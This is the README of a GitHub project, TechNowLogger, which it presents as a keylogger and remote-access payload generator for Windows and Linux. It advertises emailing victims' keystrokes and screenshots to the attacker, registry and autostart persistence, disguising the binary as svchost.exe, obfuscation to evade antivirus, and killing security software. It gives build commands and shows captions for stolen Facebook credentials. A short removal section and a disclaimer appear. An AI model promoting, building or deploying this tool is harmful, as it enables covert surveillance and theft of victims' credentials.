<p align="center">
  <img src="https://github.com/Technowlogy-Pushpender/technowlogger/blob/master/img/technowlogger-logo.png" alt="TechNowLogger Logo" width=200 height=200/>
</p>

<h1 align="center">TechNowLogger</h1>
<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3.7-green.svg">
  </a>
  <a href="https://github.com/Technowlogy-Pushpender/technowhorse/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/Technowlogy-Pushpender/technowhorse/releases">
    <img src="https://img.shields.io/badge/Release-1.2-blue.svg">
  </a>
    <a href="https://github.com/Technowlogy-Pushpender/technowhorse">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
  </a>
</p>

<p align="center">
  <img src="https://github.com/Technowlogy-Pushpender/technowlogger/blob/master/img/hacker-gif.gif" alt="Hacker GIF" width=200 height=200/>
</p>
             
                        This small python script can do really awesome work.

TechNowLogger is Keylogger Generator for Windows/Linux, which sends key-logs & screenshot via email with other juicy target info written in Python 3.

## Disclaimer
<p align="center">
  :computer: This project was created only for good purposes and personal use.
</p>

THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.

## Features
- [x] Works on Windows/Linux
- [x] Notify New Victim Via Email
- [x] Undetectable
- [x] Persistence
- [x] Sends Screenshot of Victim PC's Screen via email
- [x] Creates Executable Binary With Zero Dependencies
- [x] Create less size ~ 5mb payload with advance functionality
- [x] Ofusticate the Payload before Generating it, hence Bypassing few more antivirus
- [x] Generated Payload is Encryted with base64, hence makes extremely difficult to reverse engineer the payload
- [x] Function to Kill Antivirus on Victim PC and tries to disable the security
- [x] Awesome Colourful Interface to generate payload
- [x] On Attacker Side: While Creating Payload, Script Automatically Detects Missing Dependencies & Installs Them

## Tested On
[![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - ROLLING EDITION**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 8.1 - Pro**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 7 - Ultimate**

## Prerequisite
- [x] Python 3.X
- [x] Few External Modules

## How To Use in Linux
```bash
# Navigate to the /opt directory (optional)
$ cd /opt/

# Clone this repository
$ git clone https://github.com/Technowlogy-Pushpender/technowlogger.git

# Go into the repository
$ cd technowlogger

# Installing dependencies
$ bash installer_linux.sh

$ chmod +x paygen.py
$ ./technowgen.py  --help    or   python technowgen.py --help

# Making Payload/RAT
$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name
```

## How To Use in Windows
```bash
# Install dependencies 
$ Install latest python 3.x

# Clone this repository
$ git clone https://github.com/Technowlogy-Pushpender/technowlogger.git

# Go into the repository
$ cd technowlogger

# Installing dependencies
$ python -m pip install -r requirements.txt

# Open technowgen.py in Text editor and Configure Line 12 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe" 

# Getting Help Menu
$ python technowgen.py --help

# Making Payload/RAT
$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name
```

## How to Update

* Run updater.py to Update Autmatically or Download the latest Zip from this GitHub repo
* Note: Git Must be Installed in order to use updater.py

## Note:- Evil File will be saved inside dist/ folder, inside technowlogger/ folder

## New Screenshots:


#### Getting Help
![](/img/1.version_1.2.PNG)

#### Generating payload
![](/img/2.version_1.2.PNG)

#### Getting report
![](/img/3.version_1.2.PNG)

### Also Refer These Old Images

## ~Old Screenshots:

#### Getting Help
![](/img/1.help.png)

#### Running technowgen.py Script
![](/img/2.running_script.png)

#### Building Finished
![](/img/3.building_finished.png)

#### When Keylogger runs, it adds Registry to become persistence
![](/img/4.keylogger_added_registry_for_persistence.png)

#### Makes copy of itself and saved it inside Roaming
![](/img/5.keylogger_saved_roaming.png)

#### Typing Random text to test Keylogger
![](/img/6.randomText-to-test-keylogger.png)

#### Report 1 sended by TechNowLogger
![](/img/7.result.png)

#### Login facebook ~ Victim
![](/img/8.testing-keylogger.png)

#### Report 2 - Keylogs of facebook Credentials
![](/img/9.report-1.png)

#### Report 3 - With Screenshots
![](/img/10.report-2.png)

## Removing TechNowLogger in Windows:

#### Method 1:

   * Go to start, type regedit and run the first program, this will open the registry editor.
   * Navigate to the following path Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run There should be an entry called svchost, right click this entry and select Delete.
   * Go to your user path > AppData > Roaming, you’ll see a file named “svchost.exe”, this is the RAT, right click > Delete.
   * Restart the System.

#### Method 2:
   * Run "RemoveTechnowLogger.bat" in Infected System and then restart the PC to stop the current Running Evil File.



## Removing TechNowLogger in Linux:

   * Open Autostart file with any text editor,
     ****Autostart File Path: ~/.config/autostart/xinput.desktop****
   * Remove these 5 lines:
   
            [Desktop Entry]
            Type=Application
            X-GNOME-Autostart-enabled=true
            Name=Xinput
            Exec="destination_file_name"
        
   * Note: **destination_file_name** is that name of evil_file which you gave 
      to your Keylogger using -o parameter
   * Reboot your system and then delete the evil file stored this this below path
   * Destination Path, where Keylogger is stored : **~/.config/xnput**

## Contribute

* All Contributors are welcome, this repo needs contributors who will improve this tool to make it best.

## TODO

- [ ] Add New features
- [ ] Contribute GUI Version

## Contact

singhpushpender250@gmail.com or <a href="https://technowlogy.tk/contact-us">Contact Us</a>

## Save a Hacker from starvation 
![](/img/request.jpg)

- [ ] PayPal Me, Even 1 dollar of donation would be a great help :)
- [ ] PayPal Address: PayPal.me/anonyindia

## More Features Coming Soon...
